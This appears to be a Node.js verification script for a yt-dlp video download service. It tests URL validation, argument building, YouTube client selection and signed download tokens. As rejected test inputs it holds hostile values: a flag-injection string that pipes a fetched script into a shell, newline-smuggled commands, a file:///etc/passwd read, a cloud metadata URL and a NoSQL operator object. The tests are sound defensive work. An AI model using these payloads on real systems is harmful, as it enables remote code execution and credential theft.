/**
 * Verification for the security-critical and extraction-critical logic.
 *
 * Run with `npm run verify` after `npm run build`.
 *
 * These are the paths where a regression is both easy to introduce and
 * expensive: argument injection into yt-dlp, SSRF through a user-supplied URL,
 * download-link forgery, and the client ladder silently offering clients that
 * cannot work. None of it needs a network or a database, so it is cheap to run
 * on every change.
 */

process.env.MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/verify';
process.env.JWT_SECRET = process.env.JWT_SECRET || 'verification-only-secret-at-least-32-characters-long';

const path = require('path');
const fs = require('fs');
const os = require('os');

const DIST = path.join(__dirname, '..', 'dist');
if (!fs.existsSync(path.join(DIST, 'services', 'ytdlp.js'))) {
  console.error('dist/ not found. Run `npm run build` first.');
  process.exit(1);
}

let pass = 0;
let fail = 0;

function ok(name) {
  pass += 1;
  console.log('  PASS', name);
}

function bad(name, detail) {
  fail += 1;
  console.log('  FAIL', name, '->', detail);
}

function rejects(name, fn) {
  try {
    fn();
    bad(name, 'was accepted');
  } catch {
    ok(name);
  }
}

function accepts(name, fn) {
  try {
    fn();
    ok(name);
  } catch (error) {
    bad(name, error.message);
  }
}

function equal(name, actual, expected) {
  actual === expected ? ok(name) : bad(name, `got ${actual}, wanted ${expected}`);
}

async function main() {
  // Pointed at a directory with no generator so the default assertions describe
  // the tokenless case; script mode is exercised separately at the end.
  process.env.POT_SERVER_HOME = path.join(os.tmpdir(), 'pot-absent-' + Date.now());

  const ytdlp = require(path.join(DIST, 'services', 'ytdlp.js'));
  const tokens = require(path.join(DIST, 'services', 'downloadToken.js'));
  const { assertSafeUrl, buildArgs, currentLadder, probePotProvider, getPotMode } = ytdlp;

  console.log('\nassertSafeUrl — argument injection');
  // yt-dlp treats a leading dash as a flag, so an unvalidated URL reaching the
  // command line is remote code execution via --exec.
  rejects('leading dash (--exec vector)', () => assertSafeUrl('--exec=curl evil.sh|sh'));
  rejects('bare flag', () => assertSafeUrl('-f'));
  rejects('newline injection', () => assertSafeUrl('https://a.com\n--exec=id'));
  rejects('control character', () => assertSafeUrl('https://a.com\t-x'));

  console.log('\nassertSafeUrl — scheme and SSRF');
  rejects('file://', () => assertSafeUrl('file:///etc/passwd'));
  rejects('localhost', () => assertSafeUrl('http://localhost:5000/api'));
  rejects('loopback ip', () => assertSafeUrl('http://127.0.0.1/'));
  rejects('cloud metadata endpoint', () => assertSafeUrl('http://169.254.169.254/latest/meta-data/'));
  rejects('private 10.x', () => assertSafeUrl('http://10.0.0.5/'));
  rejects('private 192.168.x', () => assertSafeUrl('http://192.168.1.1/'));
  // An Express JSON body can deliver an object where a string is expected.
  rejects('non-string (NoSQL operator shape)', () => assertSafeUrl({ $gt: '' }));
  rejects('empty string', () => assertSafeUrl(''));
  accepts('ordinary youtube url', () => assertSafeUrl('https://www.youtube.com/watch?v=dQw4w9WgXcQ'));

  console.log('\nbuildArgs');
  const args = buildArgs(['-f', 'best'], ['https://www.youtube.com/watch?v=abc'], 'android_vr');
  const terminator = args.indexOf('--');
  if (terminator === -1) {
    bad('positional terminator present', 'no "--" in args');
  } else {
    equal('"--" immediately precedes the URL', terminator, args.length - 2);
  }
  args.some(a => String(a).includes('player_client=android_vr'))
    ? ok('selected client is passed through')
    : bad('selected client', 'absent');
  args.some(a => String(a).includes('impersonate'))
    ? ok('browser TLS impersonation requested')
    : bad('impersonate', 'absent');

  console.log('\nladder without a token source');
  await probePotProvider();
  equal('pot mode is none', getPotMode(), 'none');
  const tokenless = currentLadder();
  console.log('  ladder:', tokenless.join(' -> '));
  tokenless.includes('web') || tokenless.includes('mweb')
    ? bad('web clients excluded', 'offered with no token source')
    : ok('web clients excluded with no token source');
  buildArgs(['-f', 'best'], ['https://x.com/a'], 'web').some(a => String(a).includes('bgutil'))
    ? bad('no POT argument', 'advertised a generator that is not present')
    : ok('no POT argument when no generator is present');

  console.log('\ndownload tokens');
  const id = '507f1f77bcf86cd799439011';
  const other = '507f1f77bcf86cd799439012';
  equal('valid token accepted', tokens.verifyDownloadToken(id, tokens.issueDownloadToken(id)), 'valid');
  // The whole point: an ObjectId is guessable, a signature is not.
  equal('token bound to one resource', tokens.verifyDownloadToken(other, tokens.issueDownloadToken(id)), 'invalid');
  equal('expiry detected', tokens.verifyDownloadToken(id, tokens.issueDownloadToken(id, -10)), 'expired');
  equal('tampered signature rejected',
    tokens.verifyDownloadToken(id, tokens.issueDownloadToken(id).replace(/.$/, 'X')), 'invalid');
  equal('missing token rejected', tokens.verifyDownloadToken(id, undefined), 'invalid');
  equal('oversized token rejected', tokens.verifyDownloadToken(id, 'x'.repeat(5000)), 'invalid');
  tokens.buildDownloadUrl(id).startsWith(`/api/convert/download/${id}?t=`)
    ? ok('download URL shape')
    : bad('download URL shape', tokens.buildDownloadUrl(id));

  console.log('\nladder with a token generator present');
  // A stand-in file is enough: the probe checks for the generator's presence,
  // and running it for real needs network access to YouTube.
  const fakeHome = fs.mkdtempSync(path.join(os.tmpdir(), 'pot-present-'));
  fs.mkdirSync(path.join(fakeHome, 'build'), { recursive: true });
  fs.writeFileSync(path.join(fakeHome, 'build', 'generate_once.js'), '// stand-in\n');

  // env.ts reads this once at import, so verify in a fresh process.
  const { execFileSync } = require('child_process');
  const probe = `
    process.env.MONGODB_URI = ${JSON.stringify(process.env.MONGODB_URI)};
    process.env.JWT_SECRET  = ${JSON.stringify(process.env.JWT_SECRET)};
    process.env.POT_SERVER_HOME = ${JSON.stringify(fakeHome)};
    const y = require(${JSON.stringify(path.join(DIST, 'services', 'ytdlp.js'))});
    y.probePotProvider().then(() => {
      const arg = y.buildArgs(['-f','best'], ['https://x.com/a'], 'web')
        .find(a => String(a).includes('bgutil')) || '';
      console.log(JSON.stringify({ mode: y.getPotMode(), ladder: y.currentLadder(), arg }));
    });
  `;
  const out = JSON.parse(
    execFileSync(process.execPath, ['-e', probe], { encoding: 'utf8' })
      .trim().split('\n').pop()
  );
  console.log('  ladder:', out.ladder.join(' -> '));
  equal('pot mode is script', out.mode, 'script');
  out.ladder.includes('web') ? ok('web client added to the ladder') : bad('web client', 'not added');
  out.arg.includes('bgutilscript:server_home=')
    ? ok('script-mode POT argument emitted')
    : bad('POT argument', out.arg || '(none)');
  fs.rmSync(fakeHome, { recursive: true, force: true });

  console.log(`\n${pass} passed, ${fail} failed`);
  process.exit(fail ? 1 : 0);
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
